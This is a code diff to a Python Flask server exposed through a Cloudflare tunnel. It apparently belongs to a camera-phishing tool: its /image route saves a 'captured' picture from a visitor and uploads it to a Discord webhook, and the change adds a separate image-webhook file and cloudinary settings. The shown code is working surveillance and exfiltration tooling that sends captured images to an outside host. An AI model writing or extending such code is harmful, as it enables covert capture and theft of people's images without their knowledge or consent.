@@ -12,7 +12,7 @@ import time
 from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
 import signal
-from utils import get_file_data, update_webhook, check_and_get_webhook_url
+from utils import get_file_data, update_webhook, check_and_get_webhook_url, DISCORD_WEBHOOK_FILE_NAME
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
@@ -109,8 +109,18 @@ def image():
     i.save(local_path)
     print(f"{B}[+] {C}Picture captured and saved locally to {local_path}{W}")
 
-    webhook_url = check_and_get_webhook_url(os.getcwd())
-    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
+    # Use a separate webhook for images
+    iwebhook_path = os.path.join(os.getcwd(), "iwebhook.js")
+    if os.path.exists(iwebhook_path):
+        with open(iwebhook_path, "r") as file:
+            webhook_url = file.read().strip()
+    else:
+        # If no image-specific webhook is set, create the file using the original fallback webhook
+        webhook_url = check_and_get_webhook_url(os.getcwd())
+        with open(iwebhook_path, "w") as file:
+            file.write(webhook_url)
+
+    files = {'image': open(local_path, 'rb')}
     response = requests.post(webhook_url, files=files)
 
     return Response("Image processed and status sent to Discord webhook.", content_type="text/plain")
@@ -143,7 +153,9 @@ def serve_appjs():
 
 
 #run_flask function to handle threading
-def run_flask(folder_name):
+def run_flask(folder_name, cloudinary_enabled=False):
+    global MODULE_DIR, g_cloudinary_enabled
+    g_cloudinary_enabled = cloudinary_enabled
     try:
         os.chdir(folder_name)
         MODULE_DIR = os.path.abspath(os.getcwd())  # store absolute path
